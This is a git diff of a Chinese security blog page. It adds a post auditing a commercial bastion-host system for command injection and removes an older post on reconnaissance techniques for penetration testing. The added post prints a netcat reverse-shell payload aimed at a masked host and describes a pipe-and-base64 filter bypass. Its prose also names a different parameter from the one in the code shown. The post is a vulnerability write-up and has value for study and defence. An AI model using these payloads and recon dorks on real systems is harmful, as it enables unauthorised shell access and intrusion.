@@ -232,6 +232,155 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到审计/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JrD">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JrD's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/06/03/对某老牌堡垒机系统的从解密到审计/" itemprop="url">对某老牌堡垒机系统的从解密到审计</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-03T15:08:01+08:00">
+                2019-06-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/06/03/对某老牌堡垒机系统的从解密到审计/" class="leancloud_visitors" data-flag-title="对某老牌堡垒机系统的从解密到审计">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接上篇blog解密php，该堡垒机系统听说是处于领导地位的堡垒机系统，很多大厂也在使用，并且传说该系统没有安全漏洞，但是经过仔细的审计还是发现了bypass过滤的方法来达成后台getshell。</p>
+<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p><img src="/2019/06/03/对某老牌堡垒机系统的从解密到审计/directory.png" alt="noname"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php片段</span></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">@session_start();</span><br><span class="line">$sid = session_id();</span><br><span class="line">@session_destroy();</span><br><span class="line">$CONFIG[<span class="string">"img"</span>] = <span class="keyword">true</span>;</span><br><span class="line">$CONFIG[<span class="string">"nomaster"</span>] = <span class="keyword">true</span>;</span><br><span class="line">$CONFIG[<span class="string">"not_http_referer"</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"include/common.php"</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"include/Validate.php"</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'include/integrity.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"include/common.php"</span>);</span><br><span class="line"></span><br><span class="line">check_perm(<span class="string">"admin"</span>);</span><br></pre></td></tr></table></figure>
+<p>我们可以看到从上图看出该系统因为历史悠久，在架构上还是使用静态php文件的路由方式，并没有使用MVC的结构，整体的系统架构略显臃肿。</p>
+<p>从头部引入可以发现，该系统是采用定义<code>$CONFIG</code>数组定义一些环境变量并包含<code>common.php</code>等文件的设置，利用check_perm方法做权限的限制与鉴定。其中具体结构的实现细节与本文无关，就不多聊结构问题。</p>
+<h2 id="第一个getshell漏洞"><a href="#第一个getshell漏洞" class="headerlink" title="第一个getshell漏洞"></a>第一个getshell漏洞</h2><p>不得不说该系统其实对于安全还是处理的比较到位的，各种sql,xss都处理的比较好,也验证了referer防止了csrf。<br>这时候我想到堡垒机系统肯定需要与系统底层进行一些特殊的操作，譬如底层运维的信息的增删改查要与php动态交互，而此系统采用的是调用python的方法来实现这些功能。那这里面会不会有些问题呢？要是有就是直接getshell的大漏洞了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">python_exec</span><span class="params">($code)</span> </span>&#123;</span><br><span class="line">	$descs = <span class="keyword">array</span>();</span><br><span class="line">	$descs[<span class="number">0</span>] = <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>);</span><br><span class="line">	$descs[<span class="number">1</span>] = <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>);</span><br><span class="line">	$descs[<span class="number">2</span>] = <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (is_array($code)) $code = join(<span class="string">"\n"</span>, $code);</span><br><span class="line">	$p = proc_open(<span class="string">"/usr/bin/python2.6 -"</span>, $descs, $pipes);</span><br><span class="line">	fputs($pipes[<span class="number">0</span>], $code);</span><br><span class="line">	fclose($pipes[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	$stdout = stream_get_contents($pipes[<span class="number">1</span>]);</span><br><span class="line">	$stderr = stream_get_contents($pipes[<span class="number">2</span>]);</span><br><span class="line">	$result = proc_close($p);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">array</span>($result, $stdout, $stderr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>方法代码如上，很普通的proc_open调用python的方法。</p>
+<p>而其中在<code>common.php</code>中定义的的全局过滤方法如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import_request_variables(<span class="string">"GP"</span>, <span class="string">"req_"</span>); <span class="comment">#第一个参数GP是定义了接收类型GET、POST，第二个req_是定义了接收前缀为“req_”的参数</span></span><br><span class="line">$safe_req = <span class="string">"password crypt_passwd 省略一部分代码"</span>;<span class="comment">#定义safe_req</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($CONFIG[<span class="string">"safereq"</span>])) $CONFIG[<span class="string">"safereq"</span>]  = $safe_req;</span><br><span class="line"><span class="keyword">else</span> $CONFIG[<span class="string">"safereq"</span>] .= <span class="string">" "</span> . $safe_req;<span class="comment">#如果头文件存在$CONFIG["safereq"]设置就把设置的和$safe_req里本来有的放在一起</span></span><br><span class="line">$CONFIG[<span class="string">"safereq"</span>] = array_filter(explode(<span class="string">" "</span>, $CONFIG[<span class="string">"safereq"</span>]));<span class="comment">#分割成数组</span></span><br><span class="line"><span class="keyword">foreach</span> ($_REQUEST <span class="keyword">as</span> $k=&gt;$v) &#123; </span><br><span class="line">	<span class="keyword">if</span> (!in_array($k, $CONFIG[<span class="string">"safereq"</span>])) &#123;</span><br><span class="line">		$_ = <span class="string">"req_$k"</span>;</span><br><span class="line">		$$_ = preg_replace(<span class="string">'#[&lt;&gt;\'"\\/&amp;*;]#'</span>, <span class="string">""</span>, $v); <span class="comment">#判断是否在数组内 若不在数组内则利用正则过滤将这些特殊字符置空</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中<code>import_request_variables()</code>方法是一个在5.4.0以后就废弃的方法，在5.4.0以后一般推荐<code>extract()</code>来代替，作用<strong>是 将 GET／POST／Cookie 变量导入到全局作用域中</strong>。上面这句话是官方中文的解释，通俗点说，就是如果传入了一个”password”变量，那么php会得到一个”$req_password”的全局变量。其他的代码作用我尽量详细的写在注释里面了，方便理解。总之开发者应当是想定义一个接受安全传参的数组，若参数在这个数组内则放行，不在参数内则进行过滤。</p>
+<p>那我们找找看有没有在数组内的执行，被我找到了一个在数组内的参数<code>crypt_passwd</code>，所以发现了第一个后台getshell漏洞代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$code = <span class="keyword">array</span>(<span class="string">"#-*- coding: utf-8 -*-"</span>);</span><br><span class="line">$code[] = <span class="string">"from shterm.crypt import zip_cipher"</span>;</span><br><span class="line">$code[] = <span class="string">"print zip_cipher.encrypt('$req_crypt_passwd')"</span>;</span><br><span class="line"><span class="keyword">list</span>($result, $secret, $stderr) = python_exec($code);</span><br></pre></td></tr></table></figure></p>
+<p>根据上文可以知道<code>$req_pgp_pubkey</code>就是接收到的<code>pgp_pubkey</code>参数，而<code>pgp_pubkey</code>参数并不在<code>$safe_req</code>的定义里，这是一个漏网之鱼所以可以比较简单的构造一个python的反弹shell，payload如下<code>123&#39;);import os;os.popen(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xxx.xxx.xxx.xxx 12345 &gt;/tmp/f&#39;)#</code>这里利用了一个python其实并不是一定要换行，也可以使用<code>;</code>来做换行的小trick。结果如图：</p>
+<p><img src="/2019/06/03/对某老牌堡垒机系统的从解密到审计/burp1.png" alt="noname"><br><img src="/2019/06/03/对某老牌堡垒机系统的从解密到审计/result1.png" alt="noname"></p>
+<h2 id="绕过过滤的getshell"><a href="#绕过过滤的getshell" class="headerlink" title="绕过过滤的getshell"></a>绕过过滤的getshell</h2><p>在一个文件里审计到了如下的代码段：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$type = $req_type;</span><br><span class="line">$action = $req_action;</span><br><span class="line"></span><br><span class="line">$output = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($type == <span class="string">"mode"</span>) &#123;</span><br><span class="line">	exec(<span class="string">"sudo /usr/libexec/shterm/clusterctl drsync-mode $action"</span>, $output, $r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据之前分析的我们知道<code>$req_type</code>和<code>$req_action</code>就是接受了<code>type</code>和<code>action</code>的传参并且这两个参数都不在<code>safe_req</code>的数组里所以都被过滤了，<code>#[&lt;&gt;\&#39;&quot;\\/&amp;*;]#</code>这些特殊字符都不能传参。但是我发现特殊字符的过滤忽略了<code>|</code>和<code>-</code>符号，而<code>|</code>跟<code>-</code>符号其实是可以通过管道符号和编码绕过过滤和之前的语句，执行自己想要执行的payload甚至反弹shell的。</p>
+<p><code>|</code>管道符号的特性：<br><img src="/2019/06/03/对某老牌堡垒机系统的从解密到审计/管道.png" alt="noname"></p>
+<p>综上所述我利用base64编码构造了一个绕过过滤的payload：<br><img src="/2019/06/03/对某老牌堡垒机系统的从解密到审计/base64.png" alt="noname"><br>之后发包成功执行反弹shell：<br><img src="/2019/06/03/对某老牌堡垒机系统的从解密到审计/burp2.png" alt="noname"><br><img src="/2019/06/03/对某老牌堡垒机系统的从解密到审计/result2.png" alt="noname"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://jrdw0.github.io/2019/03/14/PHP-SCREW解密PM9SCREW/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -871,220 +1020,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://jrdw0.github.io/2018/09/28/渗透测试备忘之信息收集/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="JrD">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="JrD's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/28/渗透测试备忘之信息收集/" itemprop="url">渗透测试备忘之信息收集</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-28T20:20:39+08:00">
-                2018-09-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/09/28/渗透测试备忘之信息收集/" class="leancloud_visitors" data-flag-title="渗透测试备忘之信息收集">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="渗透测试备忘之信息收集"><a href="#渗透测试备忘之信息收集" class="headerlink" title="渗透测试备忘之信息收集"></a>渗透测试备忘之信息收集</h1><p>整理收集一下渗透测试中信息收集的各种方式方法。</p>
-<p>个人把信息手机简单分类为域名相关、IP相关、敏感信息泄露相关三大类，但其实信息收集是一个错综复杂的过程，并不能真正的做分类，仅是为了便于文章书写整理，也不应该局限思维，很多方式方法都可以自由组合使用。</p>
-<p>其实社工应当也是很大的一类，但本文不过多讨论社工。</p>
-<h2 id="IP相关"><a href="#IP相关" class="headerlink" title="IP相关"></a>IP相关</h2><h3 id="绕过CDN获取真实IP"><a href="#绕过CDN获取真实IP" class="headerlink" title="绕过CDN获取真实IP"></a>绕过CDN获取真实IP</h3><p>现在大部分大站都使用CDN来快速响应大量用户的请求，在渗透大型网站过程中，拿到真实IP也是必须的，所以先来讨论一下获取真实IP的姿势。</p>
-<h4 id="判断是否开启CDN"><a href="#判断是否开启CDN" class="headerlink" title="判断是否开启CDN"></a>判断是否开启CDN</h4><p><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a>  站长之家<br><a href="https://ping.aizhan.com/" target="_blank" rel="noopener">https://ping.aizhan.com/</a>  爱站网<br>利用一些各地服务器ping同名域名，看各地解析IP是否一致即可判断是否开启CDN</p>
-<p><a href="http://ipwhois.cnnic.net.cn/" target="_blank" rel="noopener">http://ipwhois.cnnic.net.cn/</a> 使用网信中心可以通过IP查到CNNIC及中国大陆的IP地址分配信息，可以确认公司的IP段，并且可以通过公司信息反查IP。</p>
-<h4 id="利用国外冷门DNS或子域名"><a href="#利用国外冷门DNS或子域名" class="headerlink" title="利用国外冷门DNS或子域名"></a>利用国外冷门DNS或子域名</h4><p>很多网站为了节省资源使用并不会给国外的冷门DNS或者一些多级子域名做CDN，所以在这两方面可能可以直接获取真实IP。</p>
-<p>大部分国内网站的CDN都是对内使用的，如果使用国外冷门DNS服务器解析可能可以直接解析到真实IP,下附命令及国外一些DNS服务器:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">nslookup http://foo.com 8.8.8.8</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">Google Public DNS：8.8.8.8、8.8.4.4</span><br><span class="line"></span><br><span class="line">Norton DNS：198.153.192.1、198.153.194.1</span><br><span class="line"></span><br><span class="line">OpenDNS：208.67.222.222、208.67.220.220</span><br><span class="line"></span><br><span class="line">OpenDNS Family：208.67.222.123、208.67.220.123</span><br><span class="line"></span><br><span class="line">Comodo Secure DNS：156.154.70.22、156.156.71.22</span><br><span class="line"></span><br><span class="line">ScrubIt DNS：67.138.54.100、207.225.209.66</span><br><span class="line"></span><br><span class="line">DNS Advantage：156.154.70.1、156.154.71.1</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
-<h4 id="RSS订阅、邮件订阅等"><a href="#RSS订阅、邮件订阅等" class="headerlink" title="RSS订阅、邮件订阅等"></a>RSS订阅、邮件订阅等</h4><p>很多网站提供了RSS或者邮件订阅等服务，服务器向我们发送RSS或者邮件的时候就可以获取到真实的IP，或者同一网段的IP。</p>
-<h4 id="利用网络空间搜索器"><a href="#利用网络空间搜索器" class="headerlink" title="利用网络空间搜索器"></a>利用网络空间搜索器</h4><p><a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a> fofa比zoomeye和shodan好的地方就是可以搜索title语法，利用网站title信息来进行查询，成功率很高。</p>
-<h4 id="域名解析历史记录查询"><a href="#域名解析历史记录查询" class="headerlink" title="域名解析历史记录查询"></a>域名解析历史记录查询</h4><p><a href="https://www.virustotal.com/#/domain/foo.com" target="_blank" rel="noopener">https://www.virustotal.com/#/domain/foo.com</a></p>
-<p><a href="https://toolbar.netcraft.com/site_report?url=foo.com" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report?url=foo.com</a></p>
-<p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> 微步也可以查到但是部分需要付费</p>
-<p>有些网站在使用CDN之前的IP解析也会被历史解析记录到可以试试。</p>
-<h4 id="网站自身漏洞泄露"><a href="#网站自身漏洞泄露" class="headerlink" title="网站自身漏洞泄露"></a>网站自身漏洞泄露</h4><p>像探针页面、phpinfo页面、或者利用诸如ssrf等漏洞远程访问自己的服务器。</p>
-<h3 id="C段扫描"><a href="#C段扫描" class="headerlink" title="C段扫描"></a>C段扫描</h3><p>C段扫描即因为通常情况下机房给予企业的外网IP都是在同一C段下连续的IP，所以可以对IP进行C段扫描看看是否有该目标的其他可突破IP。</p>
-<p>可以利用各种搜索引擎（IP为举例）：<br>google的<code>site:192.168.1.*</code><br>shodan的<code>net:192.168.1.0/24</code><br>zoomeyed的<code>cidr:192.168.1.0/24</code></p>
-<p>也可以利用一些在线服务：<br><a href="https://www.5kik.com/c/" target="_blank" rel="noopener">https://www.5kik.com/c/</a><br><a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a></p>
-<p>或者一些工具：<br><a href="http://www.91ri.org/7915.html" target="_blank" rel="noopener">http://www.91ri.org/7915.html</a><br><a href="http://www.7kb.org/817.html" target="_blank" rel="noopener">http://www.7kb.org/817.html</a></p>
-<p>利用Nmap的（比较耗时且使用的是ping方式）<br><code>namp -sP ip/24 -oN c:\ip.txt</code><br>扫描网站服务器c段，并且生成报告</p>
-<p>还有很多别的方式这里只是简单举例</p>
-<h3 id="获得IP之后的端口扫描"><a href="#获得IP之后的端口扫描" class="headerlink" title="获得IP之后的端口扫描"></a>获得IP之后的端口扫描</h3><p>中小型企业直接用神器nmap扫描就好，这里主要介绍一下对大型企业大量IP的端口扫描方案：<br>masscan+nmap，利用masscan号称6分钟扫遍全网端口的效率来简单扫描开放的端口，然后利用nmap再进行识别端口的详细扫描。<br>相应的命令为<code>masscan XX.XXX.XX.XXX -p1-65535 --rate 1000</code>和<code>-sV -Pn --version-all -v -T4</code>其中-sV是端口识别；-Pn是跳过发现IP端口的过程，因为这个过程在之前由masscan完成了；–version-all是提高端口识别的准确度，保证对每个端口尝试每个探测报文；-v是使用细节模式提高详细度，可以输出扫描过程的更多信息；-T4，如果用于有足够的带宽或以太网连接，建议使用-T4选项，相对默认扫描能更快。<br>接下来就是对端口扫描出来的结果分析利用了。</p>
-<h2 id="域名相关"><a href="#域名相关" class="headerlink" title="域名相关"></a>域名相关</h2><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p><a href="https://whois.icann.org/en" target="_blank" rel="noopener">https://whois.icann.org/en</a> </p>
-<p><a href="https://www.whois.net/" target="_blank" rel="noopener">https://www.whois.net/</a> whois.net</p>
-<p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> 微步威胁情报查询</p>
-<p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a> 站长之家</p>
-<p>可查询到注册人姓名、邮箱、注册地、电话、DNS服务器、注册公司信息等</p>
-<p>利用姿势：</p>
-<ol>
-<li>对注册人姓名、邮箱、电话进行反查旁站及域名和IP的历史信息</li>
-<li>对注册信息进行社工</li>
-<li>针对以上信息制作弱口令 <a href="https://www.w0ai1uo.org/mima/" target="_blank" rel="noopener">猜密码</a>用于猜解密码</li>
-</ol>
-<h3 id="网站备案号"><a href="#网站备案号" class="headerlink" title="网站备案号"></a>网站备案号</h3><p><a href="http://icp.chinaz.com/" target="_blank" rel="noopener">http://icp.chinaz.com/</a> 站长之家</p>
-<p><a href="http://www.miibeian.gov.cn/publish/query/indexFirst.action" target="_blank" rel="noopener">http://www.miibeian.gov.cn/publish/query/indexFirst.action</a> 工信部备案查询</p>
-<p>利用姿势：大中型企业的网络资产中，肯定远不止一个主域名，利用备案反查可以发现同一备案号下很多隐藏的域名。</p>
-<h3 id="SSL证书查询"><a href="#SSL证书查询" class="headerlink" title="SSL证书查询"></a>SSL证书查询</h3><p><a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a> </p>
-<p><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></p>
-<p><a href="https://myssl.com/" target="_blank" rel="noopener">https://myssl.com/</a></p>
-<p><a href="https://www.chinassl.net/ssltools/ssl-checker.html" target="_blank" rel="noopener">https://www.chinassl.net/ssltools/ssl-checker.html</a></p>
-<p>利用姿势：一样是利用反查来查询隐藏的主域名。</p>
-<h3 id="子域名、目录挖掘"><a href="#子域名、目录挖掘" class="headerlink" title="子域名、目录挖掘"></a>子域名、目录挖掘</h3><p><a href="https://pentester.land/cheatsheets/2018/11/14/subdomains-enumeration-cheatsheet.html" target="_blank" rel="noopener">子域名枚举备忘录</a></p>
-<h4 id="爬虫式扫描"><a href="#爬虫式扫描" class="headerlink" title="爬虫式扫描"></a>爬虫式扫描</h4><p>使用爬虫逐级遍历目录例如awvs的目录扫描以及burp的spider等工具</p>
-<h4 id="字典扫描"><a href="#字典扫描" class="headerlink" title="字典扫描"></a>字典扫描</h4><p>字典扫描的重点还是在于字典</p>
-<p>目录扫描工具：<br><a href="https://github.com/Strikersb/webdirscan" target="_blank" rel="noopener">https://github.com/Strikersb/webdirscan</a>  王松写的目录扫描器<br>御剑</p>
-<p>子域名扫描工具<br><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a> 高并发的DNS暴力枚举 优势在于速度快<br><a href="https://www.waitalone.cn/seay-layer-42.html" target="_blank" rel="noopener">https://www.waitalone.cn/seay-layer-42.html</a> Layer子域名挖掘机 优势在于可以探测端口、服务器信息、服务器状态<br><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a> 某大佬的在线子域名爆破|Domain fuzz</p>
-<h4 id="利用搜索引擎："><a href="#利用搜索引擎：" class="headerlink" title="利用搜索引擎："></a>利用搜索引擎：</h4><p>常用google、bing，扫子域名的常用语法 <code>site:</code>，其中bing提供了API，很多子域名扫描机也是基于bing的API实现的，详情请见：<a href="https://azure.microsoft.com/en-us/services/cognitive-services/bing-web-search-api/" target="_blank" rel="noopener">bing-web-search-api</a></p>
-<h3 id="旁站查询"><a href="#旁站查询" class="headerlink" title="旁站查询"></a>旁站查询</h3><p>旁站即同一IP下服务器搭载的不同web应用，一般的旁站查询工具都是使用bing的API，其实直接用google，bing使用<code>ip:</code>语法查询也可，这里分享几个在线查询站。<br><a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a><br><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a></p>
-<h3 id="WEB应用及容器识别"><a href="#WEB应用及容器识别" class="headerlink" title="WEB应用及容器识别"></a>WEB应用及容器识别</h3><p>非常第一网站是修改过的wordpress可以使用wpscan或者尝试/wp-admin /wp-content /readme.html等目录</p>
-<p>一般是从HTTP头部、Banner、网站目录、使用的js文件等暴露出来的信息来进行识别</p>
-<p><a href="https://builtwith.com/" target="_blank" rel="noopener">https://builtwith.com/</a> 找出网站是用什么创建的</p>
-<p><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a> 云悉 适合国内各种CMS识别</p>
-<p><a href="https://www.wappalyzer.com/" target="_blank" rel="noopener">https://www.wappalyzer.com/</a> 有浏览器插件版本</p>
-<p><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a> 钟馗之眼偏向WEB应用</p>
-<p><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a> 撒旦之眼偏向网络设备（路由、摄像头等）和服务器</p>
-<p>这两个搜索引擎在针对性渗透测试中常用的语法<br><code>site:</code>,<code>hostname:</code>,<code>CIDR:</code>（指定网段）,<code>port:</code>,<code>keyword:</code>,<code>ip:</code></p>
-<p>然后可以搜索cve、expdb、乌云镜像等之类的vuldb网站来查询是否有历史遗留的版本漏洞</p>
-<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>现在越来越多安全问题突破口是通过“人”的方式了，敏感信息泄露就是其中很大的一部分，最近很热门的就是华住的程序员把SQL带明文密码的config文件暴露在github导致了几亿数据的泄露。还有的敏感目录扫描会暴露管理后台、使用的CMS或editor等信息，从而找到exp进行突破。</p>
-<h3 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h3><p>google在安全方面的利用方式已经自成一派,详情可见：<br><a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database/</a></p>
-<p>这里只说一下有关敏感信息的常见姿势</p>
-<p>敏感文件（.mdb,.excel,.word,.zip,.rar）,查看是否存在源代码泄露。常见有.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF/web.xml泄露。</p>
-<pre><code>#举例几个常见的语法
-
-#git文件泄露
-inurl:&quot;/.git/head&quot;        # https://github.com/lijiejie/GitHack git泄露的利用
-#敏感文件泄露
-filetype:sql intitle:&quot;index of&quot;
-filetype:mdb intitle:&quot;index of&quot;
-intitle:&quot;index of&quot; etc
-inurl:service.pwd
-site:xxx.com filetype:xls,conf intext:pass
-#管理后台
-site:xxx.com 管理/后台/admin/login
-</code></pre><p>googlehack也是一个可以很灵活运用的方式，比如当你收集到网站应用目录或者参数的大致命名规律或者指纹信息，就可以用googlehack利用起来试试。</p>
-<p>另外推荐一个<a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a> 利用搜索引擎社工神器</p>
-<h3 id="JS文件敏感信息泄露"><a href="#JS文件敏感信息泄露" class="headerlink" title="JS文件敏感信息泄露"></a>JS文件敏感信息泄露</h3><p>参考：<a href="http://wooyun.jozxing.cc/static/drops/web-6710.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/web-6710.html</a><br>大致分为三类：</p>
-<ol>
-<li>泄露后台管理敏感路径或API（参数）</li>
-<li>泄露http-only保护的cookie</li>
-<li>泄露用户敏感信息</li>
-</ol>
-<h3 id="github信息泄露"><a href="#github信息泄露" class="headerlink" title="github信息泄露"></a>github信息泄露</h3><p>一个github敏感信息挖掘机供参考：<br><a href="https://github.com/UnkL4b/GitMiner" target="_blank" rel="noopener">https://github.com/UnkL4b/GitMiner</a>  GitMiner</p>
-<p>github敏感信息的搜寻方式大致思路就是利用域名，员工，IP等方式搜索相关源码或配置文件。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1135,7 +1070,7 @@ site:xxx.com 管理/后台/admin/login
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">9</span>
                   <span class="site-state-item-name">日志</span>
